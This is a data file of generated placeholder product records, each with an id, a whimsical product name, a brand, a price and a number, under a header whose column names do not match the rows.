id,title,username,language,date,content
(3141,'Ergonomic Steel Shirt','Mercedes','325923.00',748),
(8473,'Awesome Granite Pizza','Acer','158061.00',375),
(4302,'Handmade Steel Table','Intel','914094.00',794),
(1996,'Modern Plastic Chicken','Uber','840054.00',410),
(1450,'Fantastic Metal Cheese','Robot','103558.00',313),
(3611,'Awesome Plastic Ball','Sony','323731.00',482),
(2118,'Luxurious Soft Car','Robot','837647.00',582),
(1347,'Recycled Fresh Tuna','Apple','118125.00',220),
(1959,'Intelligent Soft Tuna','Vans','409482.00',777),
(3221,'Elegant Bronze Bike','HTC','265366.00',972),
(3833,'Oriental Granite Keyboard','Alienware','638293.00',166),
(2915,'Fantastic Soft Shoes','Chanel','816152.00',745),
(1811,'Intelligent Metal Towels','HTC','667902.00',146),
(4232,'Handmade Soft Bike','Toshiba','402570.00',981),
(8597,'Gorgeous Fresh Hat','Aisan','985867.00',621),
(2151,'Handmade Cotton Tuna','Mercedes','808217.00',344),
(1332,'Oriental Concrete Shoes','Mitsubishi','967681.00',437),
(7235,'Ergonomic Plastic Mouse','Hyundai','311377.00',319),
(1019,'Gorgeous Soft Chips','Pepsodent','785087.00',208),
(5813,'Intelligent Cotton Chicken','Vans','399776.00',735),
(5293,'Handcrafted Plastic Towels','FedEx','481640.00',773),
(7572,'Rustic Cotton Bacon','Alienware','358712.00',953),
(8202,'Tasty Steel Shoes','Intel','903746.00',426),
(2921,'Fantastic Frozen Towels','Uniqlo','101042.00',429),
(6162,'Ergonomic Frozen Chips','ZTE','921026.00',151),
(2415,'Handmade Wooden Shirt','Samsung','691005.00',166),
(5282,'Modern Cotton Ball','Nvidia','807400.00',101),
(9241,'Fantastic Bronze Hat','3M','558144.00',159),
(2136,'Awesome Steel Ball','AMD','524930.00',370),
(4462,'Incredible Bronze Fish','Porsche','76642.00',476),
(9195,'Awesome Soft Cheese','Toshiba','14083.00',767),
(4281,'Handcrafted Metal Chair','Polytron','632483.00',749),
(7738,'Bespoke Soft Mouse','Logitech','461765.00',337),
(3302,'Handcrafted Fresh Pizza','Uniqlo','799884.00',652),
(3243,'Licensed Cotton Table','Intel','273188.00',360),
(9659,'Awesome Granite Bacon','ZTE','426248.00',853),
(5646,'Refined Rubber Chicken','Amazon','486342.00',373),
(2239,'Elegant Concrete Computer','Logitech','692881.00',649),
(3216,'Tasty Soft Computer','Kawasaki','994676.00',830),
(8215,'Tasty Fresh Mouse','Unilever','294541.00',851),
(8754,'Intelligent Fresh Computer','Nintendo','872900.00',203),
(8638,'Electronic Fresh Car','AMD','317220.00',763),
(1356,'Sleek Steel Shoes','Asus','63630.00',875),
(3112,'Practical Fresh Car','Suzuki','433382.00',594),
(9592,'Electronic Frozen Gloves','Huawei','493932.00',148),
(4021,'Handmade Concrete Fish','Nokia','847770.00',241),
(3637,'Elegant Fresh Gloves','Hyundai','841601.00',689),
(9644,'Ergonomic Metal Soap','Mitsubishi','828636.00',517),
(9661,'Awesome Steel Keyboard','Logitech','793095.00',407),
(3120,'Practical Steel Bike','Huawei','117221.00',681),
(8175,'Fantastic Wooden Hat','Uniqlo','723744.00',334),
(9151,'Bespoke Bronze Tuna','Gucci','180502.00',407),
(9099,'Licensed Wooden Sausages','Lenovo','783819.00',214),
(3020,'Refined Fresh Bacon','FedEx','810413.00',367),
(6088,'Small Wooden Pants','Alienware','727780.00',931),
(1068,'Recycled Wooden Gloves','Huawei','438104.00',527),
(3315,'Generic Fresh Towels','Suzuki','165097.00',855),
(1216,'Oriental Fresh Car','Nintendo','468957.00',912),
(2104,'Incredible Soft Table','Unilever','351580.00',703),
(9653,'Sleek Rubber Chair','Chanel','955045.00',487),
(5651,'Awesome Steel Gloves','Motorola','188302.00',814),
(3261,'Refined Fresh Shoes','Microsoft','480727.00',905),
(5789,'Recycled Fresh Towels','Rolex','327983.00',953),
(5446,'Sleek Rubber Pants','Sony','367586.00',543),
(3869,'Handmade Wooden Gloves','Vans','107373.00',581),
(6078,'Unbranded Cotton Pizza','Sharp','826801.00',809),
(5508,'Gorgeous Steel Chicken','Samsung','413075.00',759),
(1142,'Intelligent Steel Hat','3M','70048.00',289),
(3631,'Electronic Metal Bacon','Crocs','156419.00',708),
(6752,'Rustic Steel Fish','Nokia','977360.00',112),
(7616,'Electronic Frozen Cheese','Unilever','928827.00',870),
(7652,'Handmade Fresh Shoes','FedEx','550558.00',314),
(9757,'Oriental Bronze Ball','Gucci','260949.00',928),
(5939,'Sleek Soft Hat','Logitech','706867.00',947),
(1853,'Handcrafted Rubber Keyboard','Polytron','777617.00',741),
(1779,'Incredible Wooden Gloves','Robot','746505.00',993),
(7409,'Tasty Bronze Pizza','Uber','90526.00',811),
(7204,'Handcrafted Wooden Bike','Uber','383381.00',572),
(2620,'Incredible Wooden Computer','Yamaha','632708.00',315),
(5605,'Electronic Rubber Salad','Rolex','887230.00',242),
(4695,'Intelligent Rubber Pants','Xiaomi','680526.00',695),
(3157,'Practical Granite Tuna','Uber','924176.00',384),
(3909,'Awesome Soft Chair','Microsoft','944954.00',203),
(6441,'Handmade Frozen Table','Huawei','125217.00',453),
(3611,'Incredible Wooden Towels','Lamborghini','142097.00',791),
(6961,'Electronic Rubber Shoes','Sony','754339.00',395),
(8421,'Luxurious Wooden Computer','Uber','159551.00',109),
(2390,'Modern Steel Pants','Asus','300637.00',123),
(9485,'Bespoke Soft Ball','Gucci','818374.00',890),
(9052,'Handcrafted Wooden Fish','Uber','841353.00',373),
(9514,'Electronic Cotton Hat','Apple','819474.00',295),
(9622,'Intelligent Soft Gloves','HBO','764088.00',591),
(2257,'Elegant Granite Soap','Uniqlo','844573.00',240),
(8351,'Luxurious Rubber Table','3M','500214.00',623),
(3781,'Intelligent Rubber Computer','Disney','706891.00',168),
(5095,'Practical Bronze Chicken','Mercedes','863278.00',927),
(5580,'Sleek Plastic Bacon','Audi','494573.00',826),
(1672,'Oriental Rubber Ball','Philips','176850.00',987),
(8429,'Fantastic Frozen Bacon','ZTE','68785.00',726),
(6565,'Modern Frozen Salad','Sony','823008.00',989),
(6511,'Refined Plastic Ball','Acer','481982.00',625),
(7144,'Practical Concrete Table','Ferarri','379816.00',913),
(5984,'Recycled Plastic Soap','Toshiba','862591.00',841),
(3046,'Recycled Wooden Mouse','Vans','367766.00',854),
(8722,'Small Fresh Gloves','Uber','870254.00',817),
(4161,'Modern Wooden Mouse','Adidas','563477.00',457),
(9465,'Intelligent Concrete Shoes','Lamborghini','358812.00',302),
(7892,'Handcrafted Cotton Chair','Alienware','149172.00',527),
(8590,'Fantastic Bronze Mouse','Disney','760147.00',634),
(1575,'Elegant Fresh Fish','Robot','425754.00',855),
(7405,'Electronic Wooden Bike','Amazon','523290.00',460),
(2860,'Sleek Soft Shirt','Toshiba','929041.00',421),
(6790,'Incredible Cotton Soap','AMD','228949.00',732),
(9098,'Intelligent Cotton Shoes','Chanel','421446.00',676),
(2670,'Sleek Bronze Gloves','Sharp','904045.00',863),
(5367,'Generic Metal Chips','Aisan','989480.00',370),
(6421,'Practical Bronze Pants','Hyundai','761868.00',963),
(2348,'Electronic Concrete Cheese','Unilever','330126.00',970),
(7568,'Tasty Fresh Towels','Logitech','292601.00',662),
(8582,'Handmade Cotton Bike','3M','654035.00',488),
(5641,'Fantastic Metal Bacon','Crocs','448446.00',371),
(4489,'Handcrafted Granite Pants','Acer','843747.00',135),
(4553,'Incredible Metal Cheese','Philips','525894.00',365),
(2487,'Incredible Concrete Car','Amazon','161696.00',256),
(8406,'Awesome Concrete Keyboard','Adidas','377379.00',364),
(7555,'Oriental Concrete Tuna','Unilever','380572.00',844),
(8471,'Oriental Cotton Towels','ZTE','220172.00',544),
(7247,'Incredible Fresh Computer','Intel','996013.00',368),
(7611,'Handcrafted Wooden Bacon','Aisan','275111.00',481),
(8262,'Incredible Rubber Chicken','Ferarri','96619.00',349),
(7502,'Recycled Bronze Cheese','Suzuki','334107.00',574),
(8685,'Fantastic Bronze Chicken','Pepsodent','77003.00',911),
(8514,'Fantastic Plastic Towels','Lenovo','783449.00',152),
(2149,'Fantastic Cotton Fish','Uniqlo','93402.00',622),
(8452,'Handcrafted Frozen Pizza','Polytron','124428.00',678),
(9905,'Awesome Fresh Ball','Kawasaki','691132.00',875),
(4646,'Oriental Plastic Hat','Nvidia','588539.00',840),
(6659,'Small Plastic Tuna','Ferarri','284296.00',649),
(6986,'Rustic Concrete Chips','Disney','277034.00',357),
(4095,'Practical Plastic Chicken','Polytron','122979.00',416),
(2330,'Bespoke Cotton Ball','Sony','863494.00',989),
(9729,'Luxurious Metal Pizza','3M','39277.00',135),
(4218,'Tasty Steel Towels','Toshiba','445259.00',163),
(7092,'Ergonomic Bronze Hat','Lamborghini','279061.00',811),
(4003,'Practical Rubber Computer','ZTE','169502.00',320),
(8826,'Rustic Soft Chips','Gucci','666863.00',193),
(5598,'Refined Granite Soap','Samsung','934972.00',537),
(5642,'Refined Bronze Shoes','Mercedes','644607.00',733),
(6731,'Sleek Plastic Salad','Sharp','873349.00',318),
(6641,'Recycled Wooden Chair','Sony','875562.00',493),
(6843,'Modern Bronze Salad','Asus','383689.00',972),
(8150,'Rustic Steel Tuna','Uber','371783.00',843),
(3441,'Unbranded Wooden Soap','Polytron','593408.00',394),
(1449,'Practical Fresh Table','Apple','214519.00',184),
(1040,'Handmade Steel Shirt','Acer','338947.00',845),
(2384,'Incredible Plastic Shirt','Mitsubishi','91531.00',940),
(2904,'Refined Soft Cheese','Pepsodent','133416.00',598),
(3402,'Elegant Bronze Pants','Rolex','336081.00',357),
(2072,'Fantastic Metal Bacon','Unilever','64070.00',109),
(2010,'Licensed Wooden Pants','Uber','374125.00',720),
(8416,'Handmade Cotton Hat','Amazon','847354.00',593),
(5204,'Intelligent Granite Keyboard','Uber','710103.00',807),
(1078,'Generic Wooden Mouse','Samsung','202175.00',487),
(3721,'Small Concrete Chips','Aisan','865086.00',843),
(6082,'Generic Cotton Keyboard','Porsche','980212.00',785),
(3562,'Refined Soft Chair','Acer','394628.00',943),
(8892,'Unbranded Cotton Cheese','Mitsubishi','640652.00',667),
(3140,'Luxurious Granite Salad','Lamborghini','321321.00',787),
(3923,'Fantastic Bronze Soap','Lamborghini','92570.00',819),
(8467,'Handmade Frozen Chair','Robot','317321.00',510),
(5165,'Small Concrete Pizza','Kawasaki','254762.00',125),
(3531,'Bespoke Granite Cheese','Logitech','659205.00',209),
(3680,'Licensed Plastic Table','Vans','97238.00',693),
(1926,'Elegant Metal Shoes','Aisan','417704.00',737),
(9979,'Generic Concrete Keyboard','Nvidia','651045.00',560),
(3317,'Handcrafted Concrete Chair','Polytron','361553.00',161),
(6963,'Fantastic Wooden Table','Amazon','887733.00',988),
(3909,'Awesome Frozen Pizza','IBM','999109.00',506),
(6173,'Modern Soft Salad','Uniqlo','870783.00',165),
(3634,'Recycled Bronze Mouse','Nintendo','39886.00',908),
(6013,'Oriental Frozen Ball','Gucci','857439.00',626),
(3863,'Ergonomic Rubber Hat','ZTE','102122.00',919),
(2354,'Incredible Soft Tuna','HTC','86618.00',666),
(8174,'Bespoke Cotton Pizza','3M','248547.00',590),
(3365,'Electronic Frozen Soap','Xiaomi','233603.00',487),
(8108,'Handmade Metal Keyboard','Asus','337004.00',381),
(6680,'Ergonomic Cotton Mouse','Adobe','847180.00',161),
(8382,'Ergonomic Rubber Bacon','Mitsubishi','729475.00',330),
(6462,'Practical Soft Soap','Hyundai','625815.00',101),
(6322,'Sleek Plastic Hat','Polytron','963417.00',321),
(7546,'Bespoke Soft Pants','Adobe','364971.00',610),
(7759,'Incredible Soft Chips','Intel','747079.00',224),
(1459,'Gorgeous Soft Shirt','Toyota','40907.00',837),
(9892,'Awesome Cotton Gloves','Lamborghini','604232.00',631),
(8192,'Ergonomic Plastic Cheese','Gucci','111201.00',304),
(9612,'Intelligent Granite Soap','Samsung','381705.00',148),
(3066,'Small Steel Hat','Unilever','693648.00',847),
(5821,'Intelligent Frozen Shoes','Crocs','980822.00',333),
(1903,'Oriental Fresh Chips','Rolex','857567.00',663),
(5821,'Oriental Bronze Chips','Kawasaki','746604.00',742),
(9484,'Electronic Concrete Pizza','Uber','487655.00',790),
(1652,'Sleek Bronze Table','Mitsubishi','210361.00',388),
(7569,'Generic Rubber Hat','Robot','874415.00',915),
(2974,'Gorgeous Cotton Gloves','IBM','987735.00',494),
(8236,'Incredible Concrete Hat','Logitech','745178.00',187),
(1046,'Ergonomic Soft Mouse','Xiaomi','286512.00',181),
(7769,'Fantastic Cotton Chips','Motorola','606307.00',340),
(7819,'Oriental Cotton Computer','Nintendo','365803.00',829),
(3566,'Sleek Cotton Cheese','Kawasaki','431472.00',181),
(9629,'Generic Frozen Chicken','Sharp','572125.00',129),
(1723,'Recycled Granite Bike','Nintendo','740618.00',253),
(2880,'Generic Steel Table','Lamborghini','429886.00',150),
(9450,'Ergonomic Granite Car','Chanel','502689.00',473),
(8564,'Fantastic Plastic Cheese','Audi','27138.00',802),
(6927,'Gorgeous Fresh Shoes','Amazon','539965.00',160),
(4512,'Luxurious Granite Salad','Samsung','597339.00',737),
(4302,'Fantastic Wooden Chair','Suzuki','512625.00',720),
(2962,'Incredible Steel Table','Toyota','317350.00',674),
(2654,'Handmade Rubber Ball','ZTE','672824.00',207),
(7830,'Oriental Rubber Computer','Mercedes','81278.00',598),
(4543,'Recycled Soft Chair','Microsoft','27936.00',558),
(9799,'Handmade Granite Ball','ZTE','898641.00',800),
(3269,'Ergonomic Steel Keyboard','Gucci','801306.00',665),
(2297,'Intelligent Fresh Shirt','Huawei','890648.00',664),
(4765,'Electronic Metal Ball','Philips','365866.00',254),
(9768,'Elegant Granite Towels','Yamaha','103989.00',135),
(1978,'Handmade Frozen Keyboard','IBM','800760.00',881),
(6150,'Incredible Fresh Shirt','Logitech','295602.00',559),
(7512,'Electronic Soft Bike','Nokia','623442.00',247),
(4088,'Handmade Metal Bacon','Gucci','156594.00',185),
(6563,'Practical Soft Mouse','Nintendo','673584.00',148),
(5453,'Luxurious Steel Ball','Adidas','109343.00',935),
(7646,'Generic Fresh Gloves','Crocs','627554.00',178),
(3654,'Sleek Frozen Chicken','Crocs','864624.00',771),
(5594,'Sleek Granite Soap','IBM','476264.00',194),
(5752,'Licensed Wooden Chips','Crocs','443923.00',701),
(3504,'Small Concrete Keyboard','Asus','457303.00',154),
(2567,'Oriental Wooden Pizza','Aisan','576316.00',891),
(8584,'Handmade Soft Car','Amazon','901113.00',826),
(9908,'Tasty Bronze Bike','Ferarri','804313.00',994),
(8455,'Ergonomic Steel Table','Nokia','225924.00',445),
(1322,'Tasty Concrete Chicken','Uniqlo','655706.00',730),
(2507,'Small Rubber Pizza','Aisan','466302.00',448),
(1956,'Handmade Soft Pants','Microsoft','461673.00',845),
(3485,'Handmade Granite Soap','HTC','206570.00',723),
(4714,'Small Concrete Chips','Porsche','89917.00',374),
(5179,'Awesome Concrete Car','Porsche','459673.00',817),
(6590,'Incredible Rubber Chair','Acer','552685.00',482),
(6874,'Sleek Concrete Gloves','Uber','448122.00',599),
(7623,'Ergonomic Bronze Tuna','Lamborghini','179663.00',287),
(1056,'Refined Fresh Tuna','Alienware','607429.00',344),
(4685,'Bespoke Metal Car','Microsoft','525409.00',220),
(6432,'Refined Fresh Car','Amazon','596127.00',176),
(5943,'Oriental Steel Car','Tesla','689888.00',127),
(7758,'Bespoke Plastic Salad','Alienware','182580.00',926),
(9104,'Generic Wooden Computer','Audi','798045.00',208),
(9818,'Handmade Metal Towels','Polytron','267898.00',813),
(9910,'Small Bronze Cheese','Unilever','657549.00',568),
(4506,'Handmade Plastic Hat','Adidas','71394.00',884),
(6527,'Licensed Bronze Car','Apple','949595.00',820),
(8686,'Ergonomic Cotton Gloves','Alienware','903383.00',607),
(6390,'Unbranded Rubber Car','FedEx','555539.00',770),
(4170,'Sleek Cotton Towels','Toyota','409663.00',788),
(2725,'Tasty Bronze Ball','Motorola','294512.00',159),
(5090,'Electronic Wooden Chicken','Apple','24700.00',498),
(9787,'Handcrafted Bronze Gloves','Pepsodent','595646.00',555),
(4035,'Awesome Wooden Ball','Lamborghini','80865.00',212),
(1986,'Recycled Concrete Shoes','Nvidia','977944.00',706),
(3878,'Elegant Metal Pizza','Vans','960196.00',423),
(6097,'Handcrafted Fresh Bike','Lenovo','572047.00',256),
(1289,'Small Steel Hat','HBO','854048.00',119),
(4029,'Practical Plastic Computer','Acer','539743.00',986),
(5624,'Rustic Metal Shirt','Vans','579408.00',668),
(8811,'Ergonomic Fresh Computer','Xiaomi','469286.00',333),
(3987,'Rustic Cotton Tuna','Toshiba','719721.00',957),
(8252,'Awesome Steel Shirt','Apple','563993.00',514),
(9312,'Recycled Steel Ball','Hyundai','212195.00',619),
(6479,'Generic Plastic Computer','IBM','462055.00',660),
(3078,'Modern Steel Pizza','Adidas','624285.00',407),
(9420,'Electronic Rubber Mouse','Adidas','934304.00',621),
(7890,'Handcrafted Frozen Hat','Audi','176463.00',702),
(6738,'Unbranded Metal Chips','FedEx','172625.00',576),
(8123,'Incredible Rubber Chips','Rolex','794171.00',954),
(1443,'Luxurious Frozen Car','Huawei','640965.00',651),
(4619,'Ergonomic Cotton Cheese','ZTE','837632.00',994),
(9925,'Modern Frozen Mouse','Aisan','991999.00',565),
(5806,'Handmade Soft Bike','Ferarri','540458.00',208),
(9898,'Elegant Plastic Pizza','Mercedes','989014.00',383),
(6070,'Gorgeous Rubber Pants','Apple','703041.00',558),
(6254,'Electronic Fresh Towels','AMD','392156.00',391),
(7161,'Ergonomic Fresh Chair','Asus','474255.00',343),
(5317,'Handmade Steel Chicken','Intel','448026.00',467),
(4025,'Ergonomic Steel Car','Toshiba','384086.00',954),
(6660,'Ergonomic Plastic Mouse','Motorola','690108.00',980),
(3813,'Ergonomic Granite Sausages','Philips','124804.00',388),
(8766,'Ergonomic Steel Chips','Xiaomi','758244.00',551),
(3116,'Incredible Cotton Bike','Nvidia','781917.00',863),
(8798,'Practical Plastic Pants','Uniqlo','454862.00',884),
(5664,'Unbranded Granite Bacon','Asus','822623.00',786),
(9937,'Sleek Cotton Shirt','ZTE','773672.00',991),
(2271,'Small Soft Computer','Uber','80593.00',364),
(2500,'Generic Frozen Computer','Vans','574693.00',916),
(5721,'Practical Rubber Towels','Microsoft','260649.00',614),
(5501,'Intelligent Wooden Mouse','Aisan','679668.00',881),
(3852,'Electronic Frozen Towels','Uber','314867.00',632),
(8671,'Practical Soft Hat','Acer','804838.00',870),
(5515,'Refined Bronze Shoes','IBM','466613.00',211),
(8383,'Licensed Metal Mouse','Nintendo','523591.00',953),
(9513,'Practical Cotton Keyboard','Microsoft','74701.00',838),
(8720,'Gorgeous Bronze Ball','Uniqlo','868588.00',620),
(4646,'Incredible Bronze Fish','Mercedes','301989.00',741),
(4971,'Luxurious Rubber Soap','Disney','134506.00',407),
(1294,'Unbranded Metal Salad','Unilever','838319.00',987),
(2452,'Gorgeous Fresh Chair','Yamaha','322223.00',704),
(7435,'Electronic Concrete Gloves','Pepsodent','686462.00',389),
(3443,'Small Plastic Chair','Motorola','638559.00',557),
(9516,'Handmade Metal Computer','Porsche','701927.00',611),
(5787,'Oriental Granite Cheese','Lenovo','113918.00',195),
(2063,'Unbranded Concrete Keyboard','3M','538081.00',325),
(4838,'Practical Plastic Towels','Uniqlo','612732.00',200),
(7034,'Elegant Plastic Hat','Ferarri','528661.00',965),
(4196,'Tasty Bronze Ball','Toshiba','536986.00',538),
(2316,'Small Cotton Cheese','Xiaomi','157083.00',906),
(5785,'Unbranded Soft Computer','Intel','874635.00',793),
(7698,'Small Steel Hat','Kawasaki','888927.00',228),
(7844,'Electronic Frozen Bike','Adidas','29541.00',988),
(1459,'Handmade Plastic Keyboard','Rolex','303389.00',439),
(9297,'Fantastic Frozen Soap','FedEx','348916.00',535),
(8238,'Bespoke Wooden Chicken','Nike','713502.00',399),
(2726,'Practical Soft Towels','Acer','53654.00',679),
(2334,'Generic Soft Pants','Philips','841164.00',668),
(2342,'Awesome Metal Hat','Adidas','225547.00',676),
(2192,'Small Plastic Salad','Samsung','667943.00',129),
(8831,'Electronic Concrete Car','Apple','517959.00',227),
(6092,'Sleek Steel Sausages','Nike','650567.00',927),
(6081,'Electronic Wooden Shoes','Lamborghini','669896.00',691),
(1051,'Bespoke Plastic Pants','Amazon','277104.00',934),
(2438,'Oriental Metal Gloves','Yamaha','617030.00',106),
(2975,'Luxurious Fresh Hat','Adidas','255056.00',613),
(4513,'Fantastic Concrete Pizza','Audi','116683.00',167),
(4677,'Handmade Rubber Towels','FedEx','777914.00',884),
(7563,'Generic Cotton Chair','Aisan','306592.00',326),
(2825,'Luxurious Frozen Cheese','Logitech','630870.00',208),
(3010,'Gorgeous Soft Bike','Microsoft','806229.00',391),
(4753,'Luxurious Bronze Salad','Logitech','132262.00',634),
(2293,'Awesome Rubber Ball','Audi','239186.00',409),
(5930,'Rustic Frozen Hat','IBM','913328.00',967),
(5145,'Small Cotton Towels','Unilever','272559.00',453),
(4445,'Incredible Cotton Chicken','Toyota','54723.00',516),
(5034,'Licensed Granite Gloves','Porsche','373468.00',291),
(3230,'Tasty Soft Bike','Nike','665411.00',472),
(2619,'Modern Cotton Car','Adidas','992941.00',421),
(5871,'Intelligent Wooden Chair','Alienware','240182.00',784),
(1342,'Unbranded Plastic Sausages','Logitech','527179.00',835),
(2852,'Fantastic Concrete Soap','Unilever','41290.00',188),
(2283,'Electronic Fresh Gloves','Tesla','756030.00',581),
(1813,'Gorgeous Concrete Ball','Intel','451733.00',307),
(3577,'Elegant Rubber Bacon','HBO','171717.00',153),
(8572,'Gorgeous Frozen Sausages','Polytron','549055.00',747),
(4159,'Intelligent Wooden Chicken','Robot','375679.00',275),
(7084,'Sleek Plastic Bike','Nvidia','17735.00',531),
(3530,'Generic Steel Car','Nike','131845.00',579),
(3860,'Elegant Cotton Pizza','Disney','786345.00',764),
(5828,'Modern Wooden Computer','Nokia','882154.00',599),
(6009,'Gorgeous Soft Mouse','Huawei','50385.00',137),
(2880,'Fantastic Steel Ball','Yamaha','663420.00',531),
(9373,'Gorgeous Metal Bike','Gucci','252877.00',310),
(2830,'Tasty Wooden Bacon','Lamborghini','586306.00',308),
(5626,'Rustic Rubber Towels','Alienware','285460.00',804),
(1195,'Ergonomic Steel Pants','ZTE','281459.00',857),
(8780,'Ergonomic Soft Car','Vans','437014.00',623),
(9175,'Handcrafted Bronze Bacon','Microsoft','369154.00',713),
(1243,'Elegant Frozen Computer','Nintendo','462676.00',319),
(1582,'Small Plastic Towels','Microsoft','337750.00',287),
(1202,'Rustic Frozen Tuna','Aisan','16578.00',339),
(8383,'Ergonomic Plastic Car','Sharp','718213.00',789),
(4495,'Recycled Granite Bacon','Robot','913222.00',622),
(8394,'Licensed Granite Car','Porsche','840262.00',671),
(4969,'Intelligent Fresh Chicken','Logitech','782563.00',613),
(8656,'Intelligent Frozen Bike','Huawei','116687.00',898),
(5500,'Tasty Fresh Hat','Aisan','795993.00',801),
(4207,'Awesome Bronze Chair','Vans','866865.00',902),
(2472,'Modern Metal Tuna','Nintendo','439460.00',217),
(8491,'Intelligent Concrete Chair','Ferarri','736021.00',478),
(8978,'Luxurious Metal Table','Uber','612620.00',582),
(1908,'Incredible Concrete Cheese','FedEx','737972.00',953),
(5488,'Elegant Bronze Bacon','ZTE','449703.00',666),
(6197,'Recycled Bronze Bacon','Xiaomi','408438.00',215),
(2985,'Intelligent Wooden Computer','Uniqlo','152396.00',614),
(3479,'Luxurious Granite Fish','Philips','130535.00',391),
(7948,'Handcrafted Steel Table','Nvidia','605443.00',401),
(1956,'Recycled Granite Chips','FedEx','105745.00',519),
(6471,'Licensed Bronze Salad','Toyota','672562.00',646),
(1043,'Refined Frozen Table','Polytron','817891.00',441),
(2312,'Ergonomic Bronze Cheese','Uniqlo','516827.00',726),
(6148,'Refined Bronze Shirt','Polytron','359502.00',698),
(6316,'Tasty Metal Salad','Crocs','445626.00',902),
(8113,'Recycled Frozen Soap','Adobe','279219.00',284),
(5681,'Electronic Steel Chicken','Gucci','739711.00',663),
(3512,'Sleek Rubber Salad','Alienware','678642.00',377),
(2558,'Rustic Granite Gloves','AMD','244399.00',888),
(3338,'Practical Frozen Bacon','Uniqlo','923201.00',232),
(4602,'Practical Bronze Gloves','Microsoft','273799.00',876),
(5436,'Luxurious Metal Chair','Xiaomi','299088.00',929),
(2657,'Licensed Wooden Bike','Uber','458564.00',165),
(1947,'Recycled Metal Ball','Nokia','853729.00',906),
(8848,'Intelligent Plastic Chicken','Apple','361190.00',689),
(6462,'Luxurious Soft Ball','Sharp','851881.00',407),
(8114,'Incredible Concrete Fish','Chanel','852166.00',136),
(9152,'Luxurious Steel Car','Rolex','48856.00',471),
(1261,'Awesome Concrete Pizza','Tesla','227153.00',536),
(8843,'Modern Rubber Tuna','AMD','324112.00',185),
(3083,'Sleek Soft Cheese','Asus','981190.00',775),
(8376,'Bespoke Concrete Soap','Asus','229891.00',213),
(9257,'Unbranded Cotton Salad','Pepsodent','352015.00',898),
(3508,'Generic Steel Soap','Kawasaki','305543.00',140),
(5336,'Elegant Fresh Gloves','Porsche','216437.00',781),
(8597,'Handcrafted Fresh Pizza','Porsche','738065.00',789),
(3350,'Handcrafted Rubber Soap','IBM','791991.00',708),
(2582,'Electronic Rubber Tuna','FedEx','459429.00',871),
(4537,'Elegant Bronze Bacon','Asus','123013.00',390),
(3916,'Sleek Granite Chips','Alienware','151194.00',382),
(6634,'Incredible Metal Hat','Amazon','666746.00',450),
(7660,'Bespoke Plastic Table','Polytron','273650.00',282),
(2280,'Bespoke Fresh Chicken','ZTE','460990.00',895),
(3626,'Generic Frozen Gloves','Ferarri','933007.00',627),
(6708,'Sleek Rubber Salad','Alienware','204603.00',275),
(2824,'Practical Soft Hat','Pepsodent','338085.00',368),
(7854,'Tasty Concrete Bike','Unilever','834258.00',708),
(6697,'Intelligent Concrete Ball','Suzuki','456180.00',927),
(2845,'Licensed Wooden Pizza','Porsche','446420.00',647),
(7205,'Sleek Bronze Pants','Xiaomi','599410.00',267),
(1179,'Ergonomic Metal Ball','IBM','933573.00',537),
(8624,'Bespoke Plastic Sausages','Unilever','930979.00',368),
(8597,'Recycled Concrete Table','Amazon','748373.00',591),
(5263,'Gorgeous Cotton Pizza','FedEx','556180.00',974),
(6027,'Sleek Bronze Ball','Alienware','692735.00',559),
(5757,'Handmade Granite Shoes','Microsoft','171317.00',465),
(5607,'Unbranded Rubber Computer','Intel','886833.00',198),
(2573,'Generic Cotton Mouse','Mercedes','231004.00',301),
(8205,'Modern Concrete Pizza','Aisan','430016.00',836),
(3876,'Oriental Metal Shirt','Uber','951844.00',858),
(9980,'Fantastic Concrete Tuna','Lamborghini','147118.00',479),
(5591,'Ergonomic Soft Computer','Gucci','458311.00',936),
(6998,'Small Soft Mouse','Xiaomi','724784.00',648),
(2854,'Electronic Soft Car','Rolex','497159.00',363),
(3957,'Ergonomic Plastic Bacon','Toshiba','136082.00',748),
(9454,'Generic Plastic Shirt','Audi','389459.00',808),
(7871,'Tasty Plastic Shirt','Philips','868156.00',721),
(3334,'Rustic Rubber Chicken','Unilever','166849.00',595),
(8630,'Refined Cotton Shirt','Hyundai','78444.00',950),
(7032,'Unbranded Metal Bacon','Ferarri','844374.00',342),
(5944,'Gorgeous Fresh Computer','Intel','64426.00',565),
(8218,'Tasty Concrete Car','HBO','331021.00',873),
(3796,'Handcrafted Metal Shoes','Yamaha','29060.00',690),
(7485,'Ergonomic Wooden Pizza','HBO','46224.00',937),
(4809,'Licensed Metal Chips','Rolex','642639.00',627),
(1736,'Small Concrete Keyboard','AMD','216601.00',856),
(4070,'Handmade Wooden Gloves','Suzuki','96524.00',430),
(1911,'Handmade Rubber Hat','Acer','901178.00',280),
